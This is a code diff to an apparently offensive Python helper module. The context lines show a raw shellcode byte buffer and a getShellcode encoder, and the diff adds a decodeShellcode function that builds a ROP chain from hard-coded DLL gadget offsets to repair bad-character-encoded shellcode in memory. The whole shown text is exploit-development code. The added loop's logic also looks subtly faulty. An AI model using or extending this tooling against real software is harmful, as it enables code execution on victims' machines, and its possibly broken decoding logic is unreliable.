@@ -31,6 +31,8 @@ buf += b"\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\x81\xf3"
 buf += b"\xbf\x96\x6a\x00\x53\xff\xd5"
 
 
+from struct import pack
+
 from .util_module import log
 import sys
 
@@ -101,3 +103,25 @@ def getShellcode(encoded=False, bad_chars=None, debug=False):
 
 
 # getShellcode(encoded=True, bad_chars=list(range(0, 256)), debug=True)
+
+
+def decodeShellcode(dllBase, replacements, encodedShellcode, badChars):
+
+    restoreRop = b""
+    for i in range(len(replacements)):
+        if i == 0:
+            offset = replacements[i]["index"]
+        else:
+            offset = replacements[i]["index"] - replacements[i - 1]["index"]
+        neg_offset = (-offset) & 0xFFFFFFFF
+        value = 0
+        for j in range(len(badChars)):
+            if encodedShellcode[replacements[i]["index"]] == badChars[j]:
+                value = replacements[i]["correction"]
+            value = (value << 8) | 0x11110011
+            restoreRop += pack("<L", (dllBase + 0x117C))  # pop ecx ; ret
+            restoreRop += pack("<L", (neg_offset))
+            restoreRop += pack("<L", (dllBase + 0x4A7B6))  # sub eax, ecx ;    pop ebx ; ret
+            restoreRop += pack("<L", (value))  # values in BH
+            restoreRop += pack("<L", (dllBase + 0x468EE))  # add [eax+1], bh    ; ret
+    return restoreRop
